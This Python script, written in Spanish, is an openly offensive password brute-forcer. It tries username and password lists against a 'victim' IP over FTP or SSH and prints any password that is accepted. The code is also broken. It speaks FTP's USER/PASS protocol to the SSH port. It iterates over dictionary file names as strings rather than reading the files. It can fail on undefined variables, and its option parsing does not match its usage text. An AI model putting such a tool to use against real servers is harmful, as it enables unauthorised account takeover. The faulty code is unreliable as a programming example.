import socket
import sys

def fuerza_bruta(ip, servicio, usuario, contrasena, diccionario_usuarios, diccionario_contrasenas):
    if servicio == "ssh":
        puerto = 22
    elif servicio == "ftp":
        puerto = 21
    else:
        print("Error: Servicio no soportado")
        sys.exit(1)

    for usuario in diccionario_usuarios:
        for contrasena in diccionario_contrasenas:
            try:
                conexion = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                conexion.connect((ip, puerto))
                conexion.sendall(bytes("USER " + usuario + "\n", "utf-8"))
                respuesta = conexion.recv(1024).decode("utf-8")
                if respuesta.startswith("331"):
                    conexion.sendall(bytes("PASS " + contrasena + "\n", "utf-8"))
                    respuesta = conexion.recv(1024).decode("utf-8")
                    if respuesta.startswith("230"):
                        print("Contraseña encontrada: " + contrasena)
                        return
            except socket.error:
                pass

def main():
    if len(sys.argv) != 6 and len(sys.argv) != 7:
        print("Uso: fuerza_bruta.py [-h] -s <servicio> -i <ip> -u <diccionario_usuarios> -c <diccionario_contrasenas> [-U] [-C]")
        sys.exit(1)

    ayuda = False
    servicio = sys.argv[1]
    ip = sys.argv[2]
    diccionario_usuarios = sys.argv[3]
    diccionario_contrasenas = sys.argv[4]
    mayuscula = False
    mayuscula_usuario = False
    mayuscula_contrasena = False

    if len(sys.argv) == 7:
        mayuscula = True
        if sys.argv[5] == "-U":
            mayuscula_usuario = True
        elif sys.argv[5] == "-C":
            mayuscula_contrasena = True

    if ayuda:
        print("Uso: fuerza_bruta.py [-h] -s <servicio> -i <ip> -u <diccionario_usuarios> -c <diccionario_contrasenas> [-U] [-C]")
        print("Opciones:")
        print("-h: Muestra esta ayuda")
        print("-s: Servicio al que se va a realizar el ataque")
        print("    Valores válidos: ssh, ftp")
        print("-i: Dirección IP de la víctima")
        print("-u: Diccionario de usuarios a utilizar")
        print("-c: Diccionario de contraseñas a utilizar")
        print("-U: Omitir el usuario")
        print("-C: Omitir la contraseña")
        sys.exit(0)

    if servicio not in ["ssh", "ftp"]:
        print("Error: Servicio no soportado")
        sys.exit(1)

    if mayuscula:
        if mayuscula_usuario:
            usuario = sys.argv[3].upper()
        else:
            usuario = sys.argv[3]

        if mayuscula_contrasena:
            contrasena = sys.argv[4].upper()
        else:
            contrasena = sys.argv[4]

    fuerza_bruta(ip, servicio, usuario, contrasena, diccionario_usuarios, diccionario_contrasenas)

if __name__ == "__main__":
    main()
